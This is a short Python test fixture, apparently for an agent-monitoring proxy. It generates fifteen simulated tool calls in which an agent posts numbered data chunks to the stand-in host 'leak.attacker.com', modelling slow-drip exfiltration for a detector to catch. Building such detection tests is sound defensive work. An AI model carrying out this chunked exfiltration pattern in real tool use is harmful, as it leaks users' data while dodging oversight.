from cerberus.proxy.models import ToolCallEvent


def get_slow_drip_events(session_id="attack-drip-01", agent_id="data-01") -> list[ToolCallEvent]:
    events = []
    for i in range(15):
        events.append(
            ToolCallEvent(
                session_id=session_id,
                agent_id=agent_id,
                tool_name="http_post",
                tool_server="webhook-server",
                parameters={"chunk": f"part_{i}"},
                parameter_size_bytes=120,
                parameter_entropy=4.1,
                destination_domain="leak.attacker.com",
            )
        )
    return events
